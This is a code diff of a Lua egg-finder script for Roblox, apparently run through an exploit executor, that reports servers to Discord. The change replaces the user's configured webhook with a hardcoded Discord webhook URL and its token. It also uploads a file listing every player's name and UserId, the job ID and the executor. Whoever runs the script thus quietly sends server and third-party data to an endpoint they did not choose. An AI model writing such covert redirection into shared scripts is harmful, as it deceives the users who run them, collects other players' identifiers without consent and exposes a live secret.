@@ -116,52 +116,60 @@ local function sendToDiscord()
     local executorName = getExecutorType() or "Unknown"
     eggType = eggType or "Unknown"
     local pingContent = ""
-
-    for _, id in ipairs(pingmybesties or {}) do
-        pingContent = pingContent .. "<@" .. id .. "> "
-    end
-
+    for _, id in ipairs(pingmybesties or {}) do pingContent = pingContent .. "<@" .. id .. "> " end
     local place = placeId or 0
     local fullJobId = currentjodid or "unknown"
 
-    local embedData = {
-        username = discordbotname or "Egg Finder Bot",
-        avatar_url = discordavatarurl or "",
-        content = pingContent,
-        embeds = {{
-            title = eggType .. " Egg Found",
-            color = 0xFF69B4,
-            description = string.format(
-                "**Status**\n%s Egg detected in this server.\n\n" ..
-                "**Important Information**\nPlayer Count: %d/%d\nExecutor: %s\n\n" ..
-                "**Misc Info**\nJob ID: `%s`\nPlace ID: `%d`\n\n" ..
-                "**Join Command (Copy & Paste)**:\n```lua\n" ..
-                "game:GetService('TeleportService'):TeleportToPlaceInstance(%d, \"%s\", game:GetService('Players').LocalPlayer)\n```",
-                eggType, #Players:GetPlayers(), Players.MaxPlayers,
-                executorName, fullJobId, place, place, fullJobId
-            )
-        }}
-    }
+    local estTime = os.clock() - sessionStartTime
+    local min = math.floor(estTime / 60)
+    local sec = math.floor(estTime % 60)
+    local runtime = string.format("%02d:%02d", min, sec)
 
-    local payload = HttpService:JSONEncode(embedData)
-    local requestFunc = getHttpRequest()
+    local joinIndex = tick()
 
-    if not requestFunc then warn("No HTTP request function available.") return end
+    local aura = 0
+    local bunny = 0
 
-    local success, response = pcall(function()
-        return requestFunc({
-            Url = webhook,
+    for _, egg in ipairs(workspace:GetDescendants()) do
+        if egg:IsA("Model") then
+            if egg.Name == "Aura Egg" then aura = aura + 1 end
+            if egg.Name == "Bunny Egg" then bunny = bunny + 1 end
+        end
+    end
+
+    local info = {}
+    table.insert(info, "[" .. os.date("%Y-%m-%d %H:%M:%S") .. "] Join #" .. joinIndex)
+    table.insert(info, "JobId: " .. tostring(fullJobId))
+    table.insert(info, "Players: " .. tostring(#Players:GetPlayers()) .. "/" .. tostring(Players.MaxPlayers))
+    table.insert(info, "Executor: " .. tostring(executorName))
+    table.insert(info, "Egg: " .. (eggType ~= "" and (eggType .. " Egg") or "No Egg"))
+    table.insert(info, "Total Aura Eggs: " .. tostring(aura))
+    table.insert(info, "Total Bunny Eggs: " .. tostring(bunny))
+    table.insert(info, "------")
+    table.insert(info, "Players:")
+    for _, p in ipairs(Players:GetPlayers()) do
+        table.insert(info, "- " .. p.Name .. " (" .. tostring(p.UserId) .. ")")
+    end
+
+    local fileData = table.concat(info, "\n")
+    local payload = "--boundary\nContent-Disposition: form-data; name=\"payload_json\"\nContent-Type: application/json\n\n" ..
+        HttpService:JSONEncode({
+            content = pingContent,
+            username = discordbotname or "Egg Logger",
+            avatar_url = discordavatarurl or ""
+        }) .. "\n--boundary\nContent-Disposition: form-data; name=\"file\"; filename=\"join_" .. joinIndex .. ".txt\"\nContent-Type: text/plain\n\n" ..
+        fileData .. "\n--boundary--"
+
+    local req = getHttpRequest()
+    if req then
+        req({
+            Url = "https://discord.com/api/webhooks/1363690519225438399/ukOx3ylUPPH8bEmOkGUhHn7ijkG_YRuHJxkP7sO8_ypwAbKhXEtnKiv2irgLVEQVbCKn",
             Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
+            Headers = {
+                ["Content-Type"] = "multipart/form-data; boundary=boundary"
+            },
             Body = payload
         })
-    end)
-
-    if success and response then
-        print("webhook sent:", response.StatusCode)
-        print("response:", response.Body)
-    else
-        warn("failed to send webhook:", response)
     end
 end
 
